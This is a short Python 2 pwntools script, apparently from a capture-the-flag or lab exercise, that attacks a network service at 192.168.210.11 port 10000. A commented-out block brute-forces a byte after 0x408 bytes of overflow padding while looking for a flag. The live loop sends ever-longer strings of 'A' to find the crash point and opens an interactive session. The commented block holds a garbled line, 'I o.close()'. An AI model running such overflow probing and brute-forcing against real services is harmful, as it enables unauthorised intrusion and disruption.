# -*- coding: utf-8 -*-

from pwn import *
import sys

# context.log_level = logging.ERROR
context.log_level = logging.DEBUG

crash_size = 0x408

def generate_io():
    return remote("192.168.210.11", 10000)

result = []

'''
for i in range(0x100):
    print "0x%x" % (i)
    Io = generate_io()
    Io.read()
    Io.sendline("A" * crash_size + "\x00\x00\x00\x0a" + chr(i))
    time.sleep(0.1)
    print Io.read()
    #if "flag" in Io.read():
    #    result.append(chr(i))
    #    print result
    I o.close()
    '''


i = 0x0
while True:
    try:
        i += 1
        Io = generate_io()
        time.sleep(0.1)
        Io.read()
        Io.sendline("A" * i)
        print Io.read()
        Io.interactive()
    except Exception as e:
        print e
    finally:
        Io.close()
